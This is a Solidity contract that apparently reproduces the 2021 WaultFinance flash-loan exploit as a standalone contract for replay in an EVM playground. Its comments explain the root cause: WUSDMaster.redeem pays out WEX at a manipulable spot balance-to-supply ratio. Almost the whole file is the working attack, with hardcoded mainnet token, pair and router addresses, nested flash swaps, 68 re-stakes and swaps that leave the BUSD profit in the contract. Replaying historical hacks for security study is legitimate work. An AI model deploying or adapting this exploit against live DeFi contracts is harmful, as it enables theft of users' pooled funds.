// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-08-WaultFinance).
//
// The DeFiHackLabs PoC runs the entire attack INLINE in the Foundry test contract
// `ContractTest`: `attacker = address(this)`, and BOTH flash-swap callbacks
// (`waultSwapCall` for the outer WaultSwap WUSD/BUSD pair, `pancakeCall` for the
// inner Pancake WBNB/USDT pair) live on the test itself. There is no standalone
// contract to deploy, so the playground cannot replay it directly. This contract is
// a faithful, self-contained copy of that inline attack (testExploit body → run();
// both callbacks preserved verbatim), compiled inside the registry forge project,
// so the playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/WaultFinance_exp.sol; profit (BUSD) stays in this contract.
//
// Root cause: WUSDMaster.redeem() values the WEX share it pays out as
// `wex.balanceOf(this) * amount / wusd.totalSupply()` — a live, manipulable spot
// ratio. A flash-borrowed redeem at a favorable balance/supply ratio strips ~98.8%
// of the vault's WEX; an inner flash + 68 cheap re-stakes restore the burned WUSD
// supply, and unwinding nets ~117,670 BUSD.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IWUSDMaster {
    function stake(uint256) external;
    function redeem(uint256) external;
}

contract WaultFinanceDrain {
    IERC20 constant WUSD = IERC20(0x3fF997eAeA488A082fb7Efc8e6B9951990D0c3aB);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant WEX = IERC20(0xa9c41A46a6B3531d28d5c32F6633dd2fF05dFB90);
    IUniPairV2 constant Pair1 = IUniPairV2(0x6102D8A7C963F78D46a35a6218B0DB4845d1612F); // WUSD/BUSD (WaultSwap)
    IUniPairV2 constant Pair2 = IUniPairV2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // WBNB/USDT (Pancake)
    IUniRouterV2 constant Router = IUniRouterV2(0xD48745E39BbED146eEC15b79cBF964884F9877c2); // WaultSwap router
    IWUSDMaster constant Master = IWUSDMaster(0xa79Fe386B88FBee6e492EEb76Ec48517d1eC759a);

    uint256 Pair1Amount;

    // step 0: borrow nearly all WUSD from the WUSD/BUSD pair; the WaultSwap flash
    // callback (waultSwapCall) does the redeem, the inner flash, the 68 re-stakes,
    // and the unwind. Verbatim copy of ContractTest.testExploit().
    function run() external {
        // borrow WUSD
        Pair1Amount = WUSD.balanceOf(address(Pair1)) - 1;
        Pair1.swap(Pair1Amount, 0, address(this), new bytes(1));

        // WUSD to BUSD
        WUSD.approve(address(Router), type(uint256).max);
        WUSDToBUSD();
    }

    // outer flash callback (WaultSwap pair → waultSwapCall). Verbatim.
    function waultSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        WUSD.approve(address(Master), type(uint256).max);
        // WUSD to USDT, WEX
        Master.redeem(WUSD.balanceOf(address(this)));
        Pair2.swap(40_000_000 * 1e18, 0, address(this), new bytes(1));
        WUSD.transfer(address(Pair1), Pair1Amount * 10_000 / 9975 + 1000);
    }

    // inner flash callback (Pancake pair → pancakeCall). Verbatim.
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        USDT.approve(address(Master), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        // USDT to WEX
        USDTToWEX();
        // stake to change Pair
        uint256 stakeAmout = 250_000 * 1e18;
        // Master.maxmaxStakeAmount();
        for (uint256 i = 0; i < 68; i++) {
            Master.stake(stakeAmout);
        }
        // WEX to USDT
        WEX.approve(address(Router), type(uint256).max);
        WEXToUSDT();
        USDT.transfer(address(Pair2), 40_121_000 * 1e18);
    }

    function USDTToWEX() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(WEX);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            23_000_000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function WEXToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(WEX);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WEX.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function WUSDToBUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WUSD);
        path[1] = address(BUSD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WUSD.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
